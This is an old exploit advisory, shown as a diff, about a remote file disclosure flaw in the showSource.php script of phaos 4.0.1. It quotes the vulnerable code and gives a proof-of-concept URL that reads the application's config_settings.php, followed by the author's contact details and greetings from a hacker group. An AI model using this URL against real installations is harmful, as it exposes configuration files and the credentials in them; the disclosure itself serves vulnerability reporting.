@@ -1,0 +1,44 @@
+####################################################################################
+                                          }}} Remote File Disclosure Vulnerability {{{
+ 
+                                                  in (showSource.php)  phaos4.0.1
+ 
+       MY HOmE :  WWW.PAL-HACkEr.COM                                        WWW.ATSDP.COM
+####################################################################################
+## AUTHOR :  HaCkeR_EgY
+## My HoMe :  www.PaL-HaCker.com  &   www.ATSDP.com
+## ConTacT :  hacker_egy@hotmail.com
+-----------------------------------------------
+## script: phaos4.0.1
+##download:http://sourceforge.net/project/showfiles.php?group_id=111506
+###################################################################
+### vurn C0dE :
+ 
+## line 16: 
+ 
+ showSource($file, $line, $prev, $next);  <=====
+function showSource($file, $line, $prev = 10, $next = 10) {
+   
+    if (!(file_exists($file) && is_file($file))) {
+        return trigger_error("showSource() failed, file does not exist `$file`", E_USER_ERROR);
+        return false;
+    }
+   
+    //read code
+## line 35 :   ob_start();
+    highlight_file($file); <<========
+    $data = ob_get_contents();
+    ob_end_clean();
+
+## P0C:
+            http://localhost/[path]/erorr/showSource.php?file=config_settings.php
+
+#################################################################################
+ 
+## GREETZ TO :   My BrOther and My MasTer   " Abo Mohamed "   ADMIN PAL-HACKER
+ 
+##  Thanx     : F0UaD Pr0gRaMeR  , FiReSell  , MoHamed EL Arab  ,  Mr.exe  ,  zaradusht  , and all " pal-hacker members "
+ 
+#####################################################################################
+
+# milw0rm.com [2008-04-09]
